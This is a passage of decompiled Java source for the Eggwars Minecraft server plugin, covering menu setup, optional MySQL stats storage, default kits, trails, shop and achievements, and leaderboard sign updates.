      this.partyMenu.setItem(6, (new ItemStackBuilder(Material.CHEST)).setName(ChatColor.RED + "Join").addLore(ChatColor.GRAY + "Click to join a party!").build());
      this.parties = new ArrayList();

      PlayerData var35;
      for(var36 = this.playerData.values().iterator(); var36.hasNext(); var35.party = null) {
         var35 = (PlayerData)var36.next();
      }

      this.partySelector = new SmartInventory(this, ChatColor.BLUE + "Parties");
      this.partySelector.addInventory(ChatColor.RED + "List #1");
      this.partySelector.setItem(0, 49, this.back_itemstack);
      this.playerInviter = new SmartInventory(this, ChatColor.BLUE + "Invite Players");
      this.profileInventory = Bukkit.createInventory((InventoryHolder)null, 27, (String)this.customization.inventories.get("Profile-Inventory"));
      this.cageInventory(this.profileInventory, true);
      this.profileInventory.setItem(10, this.stats_itemstack);
      this.profileInventory.setItem(13, this.inventory_itemstack);
      this.profileInventory.setItem(16, this.achievements_itemstack);
      this.votingOptions = Bukkit.createInventory((InventoryHolder)null, 9, (String)this.customization.inventories.get("Arena-Settings"));
      this.cageInventory(this.votingOptions, true);
      this.votingOptions.setItem(1, (new ItemStackBuilder(Material.WATCH)).setName(ChatColor.AQUA + "Time").build());
      this.votingOptions.setItem(4, (new ItemStackBuilder(Material.CHEST)).setName(ChatColor.GOLD + "Items").build());
      this.votingOptions.setItem(7, (new ItemStackBuilder(Material.APPLE)).setName(ChatColor.RED + "Health").build());
      this.quitInventory = Bukkit.createInventory((InventoryHolder)null, 9, (String)this.customization.inventories.get("Quit-Inventory"));
      this.quitInventory.setItem(2, this.confirm_itemstack);
      this.quitInventory.setItem(6, this.cancel_itemstack);
      this.spectatorMenu = Bukkit.createInventory((InventoryHolder)null, 9, (String)this.customization.inventories.get("Spectator-Menu"));
      this.spectatorMenu.setItem(0, this.play_itemstack);
      this.spectatorMenu.setItem(1, this.teleporter_itemstack);
      this.spectatorMenu.setItem(4, this.profile_itemstack);
      this.spectatorMenu.setItem(8, this.quit_itemstack);
      this.vault = null;
      if (this.getConfig().getBoolean("use-Vault") && Bukkit.getPluginManager().getPlugin("Vault") != null && Bukkit.getServicesManager().getRegistration(Economy.class) != null) {
         this.vault = (Economy)Bukkit.getServicesManager().getRegistration(Economy.class).getProvider();
         Bukkit.getConsoleSender().sendMessage(this.customization.prefix + "The plugin will be using vault economy instead of coins..");
      }

      if (this.config.bungee_mode_enabled && !Bukkit.getMessenger().isOutgoingChannelRegistered(this, "BungeeCord")) {
         Bukkit.getMessenger().registerOutgoingPluginChannel(this, "BungeeCord");
      }

      try {
         if (this.mysql != null) {
            this.mysql.close();
            this.mysql = null;
         }

         if (this.config.mysql_enabled) {
            Bukkit.getConsoleSender().sendMessage(this.customization.prefix + "Attempting to connect to the database and creating a table if it doesn't exist!");
            long var37 = System.currentTimeMillis();
            this.mysql = new MySQL(this, this.getConfig().getString("MySQL.table"), this.getConfig().getString("MySQL.host"), this.getConfig().getString("MySQL.port"), this.getConfig().getString("MySQL.database"), this.getConfig().getString("MySQL.username"), this.getConfig().getString("MySQL.password"));
            this.mysql.setupTable();
            Bukkit.getConsoleSender().sendMessage(this.customization.prefix + "Connection has been successfully established! it took " + (System.currentTimeMillis() - var37) + "ms to complete!");
         }
      } catch (SQLException var16) {
         var16.printStackTrace();
      }

      if (this.savingTask != null) {
         this.savingTask.cancel();
      }

      if (this.getConfig().getBoolean("Saving-Task.Enabled")) {
         this.savingTask = (new BukkitRunnable() {
            public void run() {
               final List var1 = Eggwars.this.getOnlinePlayers();
               (new BukkitRunnable() {
                  int currentPlayer = 0;

                  public void run() {
                     if (this.currentPlayer >= var1.size()) {
                        this.cancel();
                        Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Players stats have been saved!");
                     } else {
                        Player var1x = (Player)var1.get(this.currentPlayer);
                        if (var1x != null && var1x.isOnline()) {
                           PlayerData var2 = (PlayerData)Eggwars.this.playerData.get(var1x.getName());
                           var2.save(var1x);
                        }

                        ++this.currentPlayer;
                     }
                  }
               }).runTaskTimerAsynchronously(Eggwars.this.plugin, 0L, 1L);
            }
         }).runTaskTimer(this, (long)(this.getConfig().getInt("Saving-Task.Save-Every-Minutes") * 1200), (long)(this.getConfig().getInt("Saving-Task.Save-Every-Minutes") * 1200));
      } else {
         this.savingTask = null;
      }

      this.winnersMap = null;
      if (this.getConfig().getBoolean("Winners-Map.enabled")) {
         (new BukkitRunnable() {
            public void run() {
               try {
                  long var1 = System.currentTimeMillis();
                  MapView var3 = Bukkit.createMap((World)Bukkit.getWorlds().get(0));
                  Iterator var5 = var3.getRenderers().iterator();

                  while(var5.hasNext()) {
                     MapRenderer var4 = (MapRenderer)var5.next();
                     var3.removeRenderer(var4);
                  }

                  try {
                     final Image var8 = Eggwars.this.getConfig().getBoolean("Winners-Map.display-image") ? ImageIO.read(new URL(Eggwars.this.getConfig().getString("Winners-Map.image-url"))).getScaledInstance(64, 64, 2) : null;
                     var3.addRenderer(new MapRenderer() {
                        public void render(MapView var1, MapCanvas var2, Player var3) {
                           var2.drawText(25, 10, MinecraftFont.Font, "Congratulations");
                           var2.drawText(35, 20, MinecraftFont.Font, "For winning!");
                           if (var8 != null) {
                              var2.drawImage(35, 50, var8);
                           }

                        }
                     });
                  } catch (IOException var6) {
                     var6.printStackTrace();
                  }

                  Eggwars.this.winnersMap = new ItemStack(Material.MAP, 1, var3.getId());
                  Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Winners map has been loaded! took " + (System.currentTimeMillis() - var1) + "ms");
               } catch (IllegalStateException var7) {
                  Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Winners map is not currently supported on this version!");
               }

            }
         }).runTaskAsynchronously(this);
      }

      this.availableUpdate = false;
      this.checkUpdates((Player)null);
   }

   protected void checkUpdates(final Player var1) {
      if (this.getConfig().getBoolean("Check-For-Updates")) {
         (new BukkitRunnable() {
            public void run() {
            }
         }).runTaskAsynchronously(this);
      }

   }

   protected void updateArenasInventory() {
      for(int var1 = 0; var1 < this.arenaSelector.getSize(); ++var1) {
         this.arenaSelector.clear(var1);
      }

      HashMap var10 = new HashMap();
      Iterator var3 = this.arenas.values().iterator();

      while(var3.hasNext()) {
         Arena var2 = (Arena)var3.next();
         var10.put(var2, var2.teamSize);
      }

      LinkedList var11 = new LinkedList(var10.entrySet());
      Collections.sort(var11, new Comparator() {
         public int compare(Entry var1, Entry var2) {
            return (Integer)var1.getValue() - (Integer)var2.getValue();
         }
      });
      var3 = var11.iterator();

      for(int var4 = 0; (double)var4 < Math.ceil(Double.valueOf((double)this.arenas.size()) / (double)this.smartSlots.length); ++var4) {
         if (var4 >= this.arenaSelector.getSize()) {
            this.arenaSelector.addInventory(ChatColor.RED + "List #" + (var4 + 1));
            this.arenaSelector.setItem(var4, 49, this.autojoin_itemstack);
         }

         int[] var8;
         int var7 = (var8 = this.smartSlots).length;

         for(int var6 = 0; var6 < var7; ++var6) {
            int var5 = var8[var6];
            if (!var3.hasNext()) {
               break;
            }

            Arena var9 = (Arena)((Entry)var3.next()).getKey();
            var9.id = var4;
            var9.slot = var5;
            var9.updateItem(0);
         }
      }

   }

   protected void updatePartiesInventory() {
      int var1;
      for(var1 = 0; var1 < this.partySelector.getSize(); ++var1) {
         this.partySelector.clear(var1);
      }

      var1 = 0;

      for(int var2 = 0; (double)var2 < Math.ceil(Double.valueOf((double)this.parties.size()) / (double)this.smartSlots.length); ++var2) {
         if (var2 >= this.partySelector.getSize()) {
            this.partySelector.addInventory(ChatColor.RED + "List #" + (var2 + 1));
            this.partySelector.setItem(var2, 49, this.back_itemstack);
         }

         int[] var6;
         int var5 = (var6 = this.smartSlots).length;

         for(int var4 = 0; var4 < var5; ++var4) {
            int var3 = var6[var4];
            if (var1 >= this.parties.size()) {
               break;
            }

            Party var7 = (Party)this.parties.get(var1);
            var7.id = var2;
            var7.slot = var3;
            var7.updateItem();
            ++var1;
         }
      }

   }

   private void createDefaultKits() {
      FileConfiguration var1 = this.filesManager.getConfig("kits.yml");
      HashMap var2 = new HashMap();
      HashMap var3 = new HashMap();
      HashMap var4 = new HashMap();
      var2.put("Builder", "SANDSTONE, COMMON, 1000, LEATHER_HELMET, AIR, AIR, AIR");
      var3.put("Builder", Arrays.asList("WOOD_PICKAXE : 1", "SANDSTONE : 32"));
      var4.put("Builder", Arrays.asList("&7Begin with simple building material", "&7to build towards the middle"));
      var2.put("Swordsman", "STONE_SWORD, COMMON, 1000, AIR, LEATHER_CHESTPLATE, AIR, AIR");
      var3.put("Swordsman", Arrays.asList("STONE_SWORD : 1", "COOKED_BEEF : 3"));
      var4.put("Swordsman", Arrays.asList("&7Start instantly ready for a battle!", "&7Use your advantage to quickly eliminate", "&7nearby players!"));
      var2.put("Miner", "STONE_PICKAXE, COMMON, 1000, IRON_HELMET : enchant:PROTECTION_EXPLOSIONS:2, AIR, AIR, AIR");
      var3.put("Miner", Arrays.asList("STONE_PICKAXE : 1 : enchant:DIG_SPEED:1 : enchant:DURABILITY:3", "COOKED_BEEF : 2", "TNT : 1"));
      var4.put("Miner", Arrays.asList("&7Your enchanted pickaxe will help", "&7you mine faster than any one", "&7giving you the advantage to get", "&7decent gear and trap others"));
      var2.put("Hunter", "BOW, COMMON, 1000, LEATHER_HELMET, AIR, LEATHER_LEGGINGS, AIR");
      var3.put("Hunter", Arrays.asList("BOW : 1", "ARROW : 8", "COOKED_BEEF : 2"));
      var4.put("Hunter", Arrays.asList("&7Receive a normal bow and have the instant", "&7ability of knocking other players", "&7when the game starts"));
      var2.put("Armorer", "LEATHER_CHESTPLATE, COMMON, 1000, AIR, LEATHER_CHESTPLATE, LEATHER_LEGGINGS, AIR");
      var3.put("Armorer", Arrays.asList("BREAD : 2"));
      var4.put("Armorer", Arrays.asList("&7Receive a leather chest and leggings", "&7that will help you stay alive", "&7in the early stages"));
      var2.put("Trainer", "BONE, COMMON, 1000, AIR, LEATHER_CHESTPLATE, AIR, AIR");
      var3.put("Trainer", Arrays.asList("MONSTER_EGG:95 : 2", "BONE : 10", "BREAD : 1"));
      var4.put("Trainer", Arrays.asList("&7Tame some wolfs that will protect you"));
      var2.put("Enchanter", "ENCHANTMENT_TABLE, RARE, 2500, IRON_HELMET, AIR, AIR, AIR");
      var3.put("Enchanter", Arrays.asList("ENCHANTMENT_TABLE : 1", "EXP_BOTTLE : 10", "GRILLED_PORK : 1"));
      var4.put("Enchanter", Arrays.asList("&7Receive an enchanting table and", "&7start enchanting to protect your self"));
      var2.put("Miner+", "IRON_PICKAXE, RARE, 2500, IRON_HELMET : enchant:PROTECTION_EXPLOSIONS:3, AIR, AIR, AIR");
      var3.put("Miner+", Arrays.asList("IRON_PICKAXE : 1 : enchant:DIG_SPEED:3 : enchant:DURABILITY:3", "TNT : 4", "COOKED_CHICKEN : 3"));
      var4.put("Miner+", Arrays.asList("&7Your enchanted pickaxe will help", "&7you mine faster than any one", "&7giving you the advantage to get", "&7decent gear and trap others"));
      var2.put("Hunter+", "BOW, RARE, 2500, LEATHER_HELMET, AIR, LEATHER_LEGGINGS, AIR");
      var3.put("Hunter+", Arrays.asList("BOW : 1 : enchant:ARROW_DAMAGE:1", "ARROW : 16", "BREAD : 1"));
      var4.put("Hunter+", Arrays.asList("&7Receive a strong bow and have the instant", "&7ability of knocking other players", "&7when the game starts"));
      var2.put("Armorer+", "LEATHER_CHESTPLATE, RARE, 2500, LEATHER_HELMET, LEATHER_CHESTPLATE, LEATHER_LEGGINGS, LEATHER_BOOTS");
      var3.put("Armorer+", Arrays.asList("WOOD_AXE : 1", "BREAD : 2"));
      var4.put("Armorer+", Arrays.asList("&7Receive a full leather set", "&7that will help you stay alive", "&7in the early stages"));
      var2.put("Fisherman", "FISHING_ROD, RARE, 2500, LEATHER_HELMET, LEATHER_CHESTPLATE, AIR, AIR");
      var3.put("Fisherman", Arrays.asList("FISHING_ROD : 1 : enchant:KNOCKBACK:1 : enchant:DURABILITY:3", "COOKED_FISH : 10"));
      var4.put("Fisherman", Arrays.asList("&7Start with a knockback fishing rod", "&7and some of your cooked fishes"));
      var2.put("Necromancer", "MONSTER_EGG:51, RARE, 2500, LEATHER_HELMET, LEATHER_CHESTPLATE, AIR, AIR");
      var3.put("Necromancer", Arrays.asList("MONSTER_EGG:51 : 2", "COOKED_BEEF : 3"));
      var4.put("Necromancer", Arrays.asList("&7Spawn skeletons that will", "&7protect you from others"));
      var2.put("Pyro", "FLINT_AND_STEEL, RARE, 3000, AIR, LEATHER_CHESTPLATE : enchant:PROTECTION_FIRE:5, AIR, AIR");
      var3.put("Pyro", Arrays.asList("FLINT_AND_STEEL : 1", "LAVA_BUCKET : 2"));
      var4.put("Pyro", Arrays.asList("&7Set everyone on fire and", "&7watch them burn while", "&7you laugh and swim in lava"));
      var2.put("Troll", "WEB, RARE, 3000, AIR, IRON_CHESTPLATE, AIR, AIR");
      var3.put("Troll", Arrays.asList("WEB : 15"));
      var4.put("Troll", Arrays.asList("&7Trap players inside your", "&7webs and watch them go crazy", "&7as you destroy their eggs!"));
      var2.put("Blaze", "MONSTER_EGG:61, RARE, 3000, AIR, CHAINMAIL_CHESTPLATE, AIR, AIR");
      var3.put("Blaze", Arrays.asList("WOOD_SWORD : 1", "MONSTER_EGG:61 : 2"));
      var4.put("Blaze", Arrays.asList("&7Spawn blazes that will protect", "&7you and set everyone on fire!"));
      var2.put("Knight", "IRON_SWORD, LEGENDARY, 5000, AIR, AIR, AIR, AIR");
      var3.put("Knight", Arrays.asList("IRON_SWORD : 1 : enchant:DAMAGE_ALL:1", "BREAD : 2"));
      var4.put("Knight", Arrays.asList("&7Start with a very strong", "&7enchanted iron sword, but unfortunately", "&7you will have no protection"));
      var2.put("Builder+", "DIAMOND_BLOCK, LEGENDARY, 5000, AIR, CHAINMAIL_CHESTPLATE, AIR, AIR");
      var3.put("Builder+", Arrays.asList("SANDSTONE : 64", "BRICK : 1 : name:&6Special - &bBridge Builder : lore:&7Builds a bridge in the way you are looking"));
      var4.put("Builder+", Arrays.asList("&7You are the master of building", "&7You can command nature to build blocks", "&7to complete your path"));
      var2.put("Teleporter", "EYE_OF_ENDER, LEGENDARY, 5000, DIAMOND_HELMET, LEATHER_CHESTPLATE, AIR, AIR");
      var3.put("Teleporter", Arrays.asList("WOOD_SWORD : 1 : enchant:DAMAGE_ALL:1", "FIREWORK : 2 : name:&6Special - &cTeleporter : lore:&7Teleports you back to your base instantly"));
      var4.put("Teleporter", Arrays.asList("&7You are the master of time", "&7You can command time to take you back", "&7To your first location in the map"));
      var2.put("Griefer", "MONSTER_EGG, LEGENDARY, 5000, LEATHER_HELMET, LEATHER_CHESTPLATE, AIR, AIR");
      var3.put("Griefer", Arrays.asList("WOOD_SWORD : 1 : enchant:DAMAGE_ALL:1", "MONSTER_EGG:50 : 5 : name:&cCreeper"));
      var4.put("Griefer", Arrays.asList("&7Spawn creepers that will cause", "&7massive damage to the area"));
      var2.put("Snowman", "SNOW_BALL, LEGENDARY, 5000, AIR, CHAINMAIL_CHESTPLATE, AIR, AIR");
      var3.put("Snowman", Arrays.asList("WOOD_SPADE : 1 : enchant:DIG_SPEED:2", "PUMPKIN : 2", "SNOW_BLOCK : 4"));
      var4.put("Snowman", Arrays.asList("&7Build snowmen that will produce", "&7snow balls for you to farm"));
      Iterator var6 = var2.keySet().iterator();

      while(var6.hasNext()) {
         String var5 = (String)var6.next();
         String var7 = (String)var2.get(var5);
         List var8 = (List)var3.get(var5);
         List var9 = (List)var4.get(var5);
         String var10 = "Kits." + var5 + ".";
         var1.set(var10 + "item", var7.split(", ")[0]);
         var1.set(var10 + "permission", "none");
         var1.set(var10 + "rarity", var7.split(", ")[1]);
         var1.set(var10 + "value", Integer.valueOf(var7.split(", ")[2]));
         var1.set(var10 + "helmet", var7.split(", ")[3]);
         var1.set(var10 + "chestplate", var7.split(", ")[4]);
         var1.set(var10 + "leggings", var7.split(", ")[5]);
         var1.set(var10 + "boots", var7.split(", ")[6]);
         var1.set(var10 + "items", var8);
         var1.set(var10 + "description", var9);
      }

      this.filesManager.saveConfig("kits.yml");
   }

   protected void createDefaultTrails() {
      FileConfiguration var1 = this.filesManager.getConfig("trails.yml");
      HashMap var2 = new HashMap();
      Material[] var3 = new Material[]{Material.STONE, Material.GRASS, Material.DIRT, Material.COBBLESTONE, Material.WOOD, Material.LOG, Material.SNOW_BLOCK, Material.SANDSTONE, Material.SPONGE, Material.BRICK, Material.MELON_BLOCK};
      Material[] var7 = var3;
      int var6 = var3.length;

      for(int var5 = 0; var5 < var6; ++var5) {
         Material var4 = var7[var5];
         var2.put(var4.name().substring(0, 1) + var4.name().substring(1, var4.name().length()).toLowerCase().replace("_block", "") + " Trail", var4.name() + ", COMMON, 1250");
      }

      Material[] var10 = new Material[]{Material.BOOKSHELF, Material.OBSIDIAN, Material.ICE, Material.WORKBENCH, Material.FURNACE, Material.PUMPKIN};
      Material[] var8 = var10;
      int var14 = var10.length;

      for(var6 = 0; var6 < var14; ++var6) {
         Material var11 = var8[var6];
         var2.put(var11.name().substring(0, 1) + var11.name().substring(1, var11.name().length()).toLowerCase().replace("_block", "") + " Trail", var11.name() + ", RARE, 2000");
      }

      Material[] var12 = new Material[]{Material.DIAMOND_BLOCK, Material.GLOWSTONE, Material.EMERALD_BLOCK, Material.TNT, Material.REDSTONE_BLOCK};
      Material[] var9 = var12;
      int var16 = var12.length;

      for(var14 = 0; var14 < var16; ++var14) {
         Material var13 = var9[var14];
         var2.put(var13.name().substring(0, 1) + var13.name().substring(1, var13.name().length()).toLowerCase().replace("_block", "") + " Trail", var13.name() + ", LEGENDARY, 3000");
      }

      Iterator var17 = var2.keySet().iterator();

      while(var17.hasNext()) {
         String var15 = (String)var17.next();
         String var18 = "Trails." + var15 + ".";
         String[] var19 = ((String)var2.get(var15)).split(", ");
         var1.set(var18 + "item", var19[0]);
         var1.set(var18 + "permission", "none");
         var1.set(var18 + "rarity", var19[1]);
         var1.set(var18 + "value", Integer.valueOf(var19[2]));
      }

      this.filesManager.saveConfig("trails.yml");
   }

   protected void createDefaultShop() {
      FileConfiguration var1 = this.filesManager.getConfig("shop.yml");
      ArrayList var2 = new ArrayList();
      Iterator var4 = this.kits.values().iterator();

      Kit var3;
      while(var4.hasNext()) {
         var3 = (Kit)var4.next();
         if (var3.rarity == Enums.Rarity.COMMON) {
            var2.add(var3);
         }
      }

      var4 = this.kits.values().iterator();

      while(var4.hasNext()) {
         var3 = (Kit)var4.next();
         if (var3.rarity == Enums.Rarity.RARE) {
            var2.add(var3);
         }
      }

      var4 = this.kits.values().iterator();

      while(var4.hasNext()) {
         var3 = (Kit)var4.next();
         if (var3.rarity == Enums.Rarity.LEGENDARY) {
            var2.add(var3);
         }
      }

      int var12 = 0;

      int var6;
      int var8;
      for(int var13 = 1; (double)var13 < Math.ceil(Double.valueOf((double)var2.size()) / (double)this.smartSlots.length) + 1.0D; ++var13) {
         String var5 = "Shops.&cKits #" + var13 + ".";
         int[] var9;
         var8 = (var9 = this.smartSlots).length;

         for(int var7 = 0; var7 < var8; ++var7) {
            var6 = var9[var7];
            if (var12 >= var2.size()) {
               break;
            }

            var1.set(var5 + var6, ((Kit)var2.get(var12)).name);
            ++var12;
         }
      }

      ArrayList var15 = new ArrayList();
      Iterator var16 = this.trails.values().iterator();

      Trail var14;
      while(var16.hasNext()) {
         var14 = (Trail)var16.next();
         if (var14.rarity == Enums.Rarity.COMMON) {
            var15.add(var14);
         }
      }

      var16 = this.trails.values().iterator();

      while(var16.hasNext()) {
         var14 = (Trail)var16.next();
         if (var14.rarity == Enums.Rarity.RARE) {
            var15.add(var14);
         }
      }

      var16 = this.trails.values().iterator();

      while(var16.hasNext()) {
         var14 = (Trail)var16.next();
         if (var14.rarity == Enums.Rarity.LEGENDARY) {
            var15.add(var14);
         }
      }

      int var17 = 0;

      for(var6 = 1; (double)var6 < Math.ceil(Double.valueOf((double)var15.size()) / (double)this.smartSlots.length) + 1.0D; ++var6) {
         String var18 = "Shops.&eTrails #" + var6 + ".";
         int[] var11;
         int var10 = (var11 = this.smartSlots).length;

         for(int var19 = 0; var19 < var10; ++var19) {
            var8 = var11[var19];
            if (var17 >= var15.size()) {
               break;
            }

            var1.set(var18 + var8, ((Trail)var15.get(var17)).name);
            ++var17;
         }
      }

      this.filesManager.saveConfig("shop.yml");
   }

   protected void createDefaultAchievements() {
      FileConfiguration var1 = this.filesManager.getConfig("achievements.yml");
      Enums.AchievementType[] var5;
      int var4 = (var5 = Enums.AchievementType.values()).length;

      for(int var3 = 0; var3 < var4; ++var3) {
         Enums.AchievementType var2 = var5[var3];
         if (!var1.contains("Achievements." + var2.name().toLowerCase())) {
            int[] var9;
            int var8 = (var9 = var2.levels).length;

            for(int var7 = 0; var7 < var8; ++var7) {
               int var6 = var9[var7];
               String var10 = "Achievements." + var2.name().toLowerCase() + "." + var6 + ".";
               var1.set(var10 + "description", var2.defaultDescription.replace("%x%", String.valueOf(var6)));
               var1.set(var10 + "prize-description", "Earn " + var2.prizeMultiplier * var6 + " coins!");
               var1.set(var10 + "executed-command", "ew coins add %player% " + var2.prizeMultiplier * var6);
            }
         }
      }

      this.filesManager.saveConfig("achievements.yml");
   }

   protected void startLeaderboardUpdater() {
      if (this.leaderboard_updater != null) {
         this.plugin.leaderboard_updater.cancel();
      }

      this.leaderboard_updater = (new BukkitRunnable() {
         public void run() {
            Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Updating leaderboards...");
            HashMap var1 = new HashMap();
            HashMap var2 = new HashMap();
            HashMap var3 = new HashMap();
            Iterator var5 = Eggwars.this.topSigns.keySet().iterator();

            while(true) {
               int var8;
               Enums.Stat var9;
               label90:
               do {
                  while(true) {
                     while(var5.hasNext()) {
                        Location var4 = (Location)var5.next();
                        Block var6 = var4.getBlock();
                        if (var6.getState() instanceof Sign) {
                           Sign var7 = (Sign)var6.getState();
                           if (var7.getLine(0).startsWith(ChatColor.AQUA + "Top #" + ChatColor.RED) && Enums.Stat.getByName(var7.getLine(1).toUpperCase()) != null && Eggwars.this.checkNumbers(ChatColor.stripColor(var7.getLine(0).split("#")[1]))) {
                              var8 = Integer.valueOf(ChatColor.stripColor(var7.getLine(0).split("#")[1]));
                              var9 = Enums.Stat.valueOf(var7.getLine(1).toUpperCase());
                              var2.put(var4, var8);
                              var3.put(var4, var9);
                              continue label90;
                           }

                           Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Your top sign with the id of " + ChatColor.AQUA + "#" + (Integer)Eggwars.this.topSigns.get(var4) + ChatColor.GRAY + " isn't really a top sign");
                        } else {
                           Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Your top sign with the id of " + ChatColor.AQUA + "#" + (Integer)Eggwars.this.topSigns.get(var4) + ChatColor.GRAY + " doesn't exist at the coordinates " + ChatColor.GREEN + Eggwars.this.getReadableLocationString(var4, false));
                        }
                     }

                     if (var2.isEmpty()) {
                        Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Couldn't find any valid top sign to update!");
                        if (Eggwars.this.hologramsManager == null || Eggwars.this.hologramsManager.leaderboard == null) {
                           Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "No Holographic leaderboard was set either, cancelling the task!");
                           this.cancel();
                           Eggwars.this.leaderboard_updater = null;
                           return;
                        }
                     } else {
                        Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Finished loading all the top signs and their requirements! (" + var2.size() + ") sign(s)! loading players stats...");
                     }

                     try {
                        HashMap var14 = Eggwars.api.getAllPlayersData();
                        Iterator var17 = var1.keySet().iterator();

                        int var19;
                        while(var17.hasNext()) {
                           Enums.Stat var15 = (Enums.Stat)var17.next();
                           var19 = (Integer)var1.get(var15);
                           List var20 = Eggwars.api.getTopPlayers(var14, var15, var19);
                           Iterator var10 = var3.keySet().iterator();

                           while(var10.hasNext()) {
                              Location var21 = (Location)var10.next();
                              if (((Enums.Stat)var3.get(var21)).equals(var15)) {
                                 Sign var11 = (Sign)var21.getBlock().getState();
                                 Entry var12 = (Entry)var20.get((Integer)var2.get(var21) - 1);
                                 var11.setLine(2, (String)var12.getKey());
                                 var11.setLine(3, "(" + var12.getValue() + ")");
                                 var11.update();
                                 Eggwars.this.updateSkull(var11, (String)var12.getKey());
                              }
                           }
                        }

                        if (Eggwars.this.hologramsManager != null && Eggwars.this.hologramsManager.leaderboard != null) {
                           Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Updating the Holographic leaderboard...");
                           final HashMap var16 = new HashMap();
                           Enums.Stat[] var22;
                           var8 = (var22 = Enums.Stat.values()).length;

                           for(var19 = 0; var19 < var8; ++var19) {
                              Enums.Stat var18 = var22[var19];
                              var16.put(var18, (Entry)Eggwars.api.getTopPlayers(var14, var18, 1).get(0));
                           }

                           (new BukkitRunnable() {
                              public void run() {
                                 Eggwars.this.hologramsManager.updateLeaderboard(var16);
                              }
                           }).runTask(Eggwars.this.plugin);
                        }

                        Eggwars.this.leaderboard_updater_time = System.currentTimeMillis() + (long)(Eggwars.this.getConfig().getInt("Update-Leaderboard-Every-Minutes") * '\uea60');
                        Bukkit.getConsoleSender().sendMessage(Eggwars.this.customization.prefix + "Leaderboards were updated!");
                     } catch (SQLException var13) {
                        var13.printStackTrace();
                     }

                     return;
                  }
               } while(var1.containsKey(var9) && (Integer)var1.get(var9) >= var8);

               var1.put(var9, var8);
            }
         }
      }).runTaskTimer(this, 0L, (long)(this.getConfig().getInt("Update-Leaderboard-Every-Minutes") * 1200));
   }

   private void updateSkull(Sign var1, String var2) {
      if (var2.contains("NO_PLAYER")) {
         var2 = "MHF_Question";
      }

      Location[] var3 = new Location[]{var1.getLocation().add(0.0D, 1.0D, 0.0D), var1.getLocation().clone().add(1.0D, 1.0D, 0.0D), var1.getLocation().clone().add(-1.0D, 1.0D, 0.0D), var1.getLocation().clone().add(0.0D, 1.0D, 1.0D), var1.getLocation().clone().add(0.0D, 1.0D, -1.0D)};
      Location[] var7 = var3;
      int var6 = var3.length;

      for(int var5 = 0; var5 < var6; ++var5) {
         Location var4 = var7[var5];
         if (var4.getBlock().getState() instanceof Skull) {
            Skull var8 = (Skull)var4.getBlock().getState();
            var8.setOwner(var2);
            var8.update();
            break;
         }
      }

   }

   public int getAmount(Player var1, ItemStack var2, boolean var3) {
      int var4 = 0;
      ItemStack[] var8;
      int var7 = (var8 = var1.getInventory().getContents()).length;

      for(int var6 = 0; var6 < var7; ++var6) {
         ItemStack var5 = var8[var6];
         if (var5 != null && var5.getType().equals(var2.getType()) && var5.getDurability() == var2.getDurability() && (!var3 || var2.getItemMeta().equals(var5.getItemMeta()))) {
            var4 += var5.getAmount();
         }
      }

      return var4;
   }

   protected boolean hasItem(Player var1, ItemStack var2, boolean var3) {
      return this.getAmount(var1, var2, var3) >= var2.getAmount();
   }

   protected void removeItem(Player var1, ItemStack var2, boolean var3) {
      int var4 = var2.getAmount();
      ItemStack[] var8;
      int var7 = (var8 = var1.getInventory().getContents()).length;

      for(int var6 = 0; var6 < var7; ++var6) {
         ItemStack var5 = var8[var6];
         if (var5 != null && var5.getType().equals(var2.getType()) && var5.getDurability() == var2.getDurability() && (!var3 || var2.getItemMeta().equals(var5.getItemMeta()))) {
            if (var5.getAmount() > var4) {
               var5.setAmount(var5.getAmount() - var4);
               break;
            }

            var4 -= var5.getAmount();
            var1.getInventory().removeItem(new ItemStack[]{var5});
            var5.setAmount(0);
            var5.setType(Material.AIR);
         }
      }

   }

   public boolean hasSpace(Player var1, ItemStack var2) {
      int var3 = var2.getAmount();

      for(int var4 = 0; var4 < 36; ++var4) {
         ItemStack var5 = var1.getInventory().getItem(var4);
         if (var5 != null && !var5.getType().equals(Material.AIR)) {
            if (var2.getType().equals(var5.getType()) && var2.getItemMeta().equals(var5.getItemMeta()) && var5.getAmount() < 64) {
               var3 -= 64 - var5.getAmount();
            }
         } else {
            var3 -= 64;
         }

         if (var3 <= 0) {
            return true;
         }
      }

      return false;
   }

   public void addItem(Player var1, ItemStack var2) {
      int var3 = var2.getAmount();
      ArrayList var4 = new ArrayList();

      int var5;
      for(var5 = 0; var5 < 36; ++var5) {
         ItemStack var6 = var1.getInventory().getItem(var5);
         if (var6 != null && !var6.getType().equals(Material.AIR)) {
            if (var2.getType().equals(var6.getType()) && var2.getItemMeta().equals(var6.getItemMeta()) && var6.getAmount() < 64) {
               if (var6.getAmount() + var3 <= 64) {
                  var6.setAmount(var6.getAmount() + var3);
                  boolean var7 = false;
                  return;
               }

               var3 = var6.getAmount() + var3 - 64;
               var6.setAmount(64);
            }
         } else {
            var4.add(var5);
         }
      }

      for(var5 = 0; var3 > 0 && var4.size() > var5; ++var5) {
         if (var3 <= 64) {
            var2.setAmount(var3);
            var3 = 0;
         } else {
            var2.setAmount(64);
            var3 -= 64;
         }

         var1.getInventory().setItem((Integer)var4.get(var5), var2);
      }

   }

   protected ItemStack getItemStack(String var1, boolean var2, boolean var3) {
      String[] var4 = var1.split(" : ");
      ItemStackBuilder var5 = new ItemStackBuilder(var4[0].contains(":") ? Material.getMaterial(var4[0].split(":")[0].toUpperCase()) : Material.getMaterial(var4[0].toUpperCase()));
      if (var2) {
         var5.setAmount(Integer.valueOf(var4[1]));
      }

      if (var4[0].contains(":")) {
         if (var5.getType().name().contains("POTION") && var4[0].split(":").length > 3) {
            var5.setPotionEffect(var4[0].split(":")[1].toUpperCase(), Integer.valueOf(var4[0].split(":")[2]), Integer.valueOf(var4[0].split(":")[3]));
         } else {
            var5.setDurability(Integer.valueOf(var4[0].split(":")[1]));
         }
      }

      if (var3) {
         for(int var6 = var2 ? 2 : 1; var6 < var4.length; ++var6) {
            String var7 = var4[var6].split(":")[0].toLowerCase();
